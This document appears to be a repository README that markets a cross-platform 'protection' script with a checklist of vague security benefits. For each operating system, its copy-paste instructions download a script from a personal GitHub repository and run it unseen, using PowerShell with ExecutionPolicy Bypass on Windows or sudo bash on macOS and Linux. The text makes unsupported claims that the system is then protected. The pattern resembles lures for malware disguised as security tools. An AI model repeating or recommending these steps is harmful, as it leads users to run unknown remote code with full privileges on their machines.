<p align="center">
  <strong>Click your operating system to optimize security</strong>
</p>

<p align="center">
  <a href="#windows-install-instructions">
    <img src="./assets/windows.png" alt="Windows Logo" width="120" style="margin: 0 40px;"/>
  </a>
  <a href="#macos-install-instructions">
    <img src="./assets/macos.png" alt="macOS Logo" width="120" style="margin: 0 40px;"/>
  </a>
  <a href="#linux-install-instructions">
    <img src="./assets/linux.png" alt="Linux Logo" width="120" style="margin: 0 40px;"/>
  </a>
</p>

<br>

<p style="line-height: 1.5;">✓ Enables Firewall</p>
<p style="line-height: 1.5;">✓ Blocks unauthorized access</p>
<p style="line-height: 1.5;">✓ Reduces attack surface by disabling unused services</p>
<p style="line-height: 1.5;">✓ Applies security settings</p>
<p style="line-height: 1.5;">✓ Enhances overall system stability and performance</p>
<p style="line-height: 1.5;">✓ Prevents common security vulnerabilities</p>

<br>

<h2 id="windows-install-instructions">Windows</h2>
<img align="right" width="120" src="./assets/windows.png">
<p>This requires you to have at least 200 MB of free space available.</p>
<ol style="line-height: 1.5;">
  <li><strong>Open Command Prompt</strong>
    <ul>
      <li>Press <code>Windows + R</code></li>
      <li>Type <code>cmd</code></li>
      <li>Press <code>Enter</code></li>
    </ul>
  </li>
  <li><strong>Download Git Installer</strong>
    <ul>
      <li>Copy and paste the following command into Command Prompt to download the Git installer:</li>
      <pre><code>powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/latest/download/Git-64-bit.exe -OutFile Git-64-bit.exe"</code></pre>
    </ul>
  </li>
  <li><strong>Install Git</strong>
    <ul>
      <li>Once downloaded, copy and paste the following command into Command Prompt to silently install Git:</li>
      <pre><code>.\Git-64-bit.exe /VERYSILENT /NORESTART</code></pre>
    </ul>
  </li>
  <li><strong>Install Protection</strong>
    <ul>
      <li>Copy and paste the following command into Command Prompt to download the protection script:</li>
      <pre><code>curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1</code></pre>
    </ul>
  </li>
  <li><strong>Run Protection</strong>
    <ul>
      <li>Copy and paste the following command into Command Prompt to run the protection script:</li>
      <pre><code>powershell -ExecutionPolicy Bypass -File .\win.ps1</code></pre>
    </ul>
  </li>
</ol>
<p>Your PC is now protected from unwanted activity.</p>

<br>

<h2 id="macos-install-instructions">MacOS</h2>
<img align="right" width="120" src="./assets/macos.png">
<p>This requires you to have at least 100 MB of free space available.</p>
<ol style="line-height: 1.5;">
  <li><strong>Open Terminal</strong>
    <ul>
      <li>Press <code>Command + Space</code></li>
      <li>Type <code>Terminal</code></li>
      <li>Press <code>Enter</code></li>
    </ul>
  </li>
  <li><strong>Install Homebrew</strong>
    <ul>
      <li>Copy and paste the following command into Terminal to install Homebrew:</li>
      <pre><code>/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</code></pre>
    </ul>
  </li>
  <li><strong>Install Git</strong>
    <ul>
      <li>Copy and paste the following command into Terminal to install Git via Homebrew:</li>
      <pre><code>brew install git</code></pre>
    </ul>
  </li>
  <li><strong>Install Protection</strong>
    <ul>
      <li>Copy and paste the following command into Terminal to download the protection script:</li>
      <pre><code>curl -o mac.sh https://raw.githubusercontent.com/boolskii/protection/main/mac.sh</code></pre>
    </ul>
  </li>
  <li><strong>Run Protection</strong>
    <ul>
      <li>Copy and paste the following command into Terminal to run the protection script:</li>
      <pre><code>sudo bash ./mac.sh</code></pre>
    </ul>
  </li>
</ol>
<p>Your Mac is now protected from unwanted activity.</p>

<br>

<h2 id="linux-install-instructions">Linux</h2>
<img align="right" width="120" src="./assets/linux.png">
<p>This requires you to have at least 100 MB of free space available.</p>
<ol style="line-height: 1.5;">
  <li><strong>Open Terminal</strong>
    <ul>
      <li>Press <code>Ctrl + Alt + T</code> </li>
    </ul>
  </li>
  <li><strong>Update Package Lists</strong>
    <ul>
      <li>Copy and paste the following command into Terminal to update package lists:</li>
      <pre><code>sudo apt-get update</code></pre>
    </ul>
  </li>
  <li><strong>Install Git</strong>
    <ul>
      <li>Copy and paste the following command into Terminal to install Git:</li>
      <pre><code>sudo apt-get install git -y</code></pre>
    </ul>
  </li>
  <li><strong>Install Protection</strong>
    <ul>
      <li>Copy and paste the following command into Terminal to download the protection script:</li>
      <pre><code>curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh</code></pre>
    </ul>
  </li>
  <li><strong>Run Protection</strong>
    <ul>
      <li>Copy and paste the following command into Terminal to run the protection script:</li>
      <pre><code>sudo bash ./lin.sh</code></pre>
    </ul>
  </li>
</ol>
<p>Your system is now protected from unwanted activity.</p>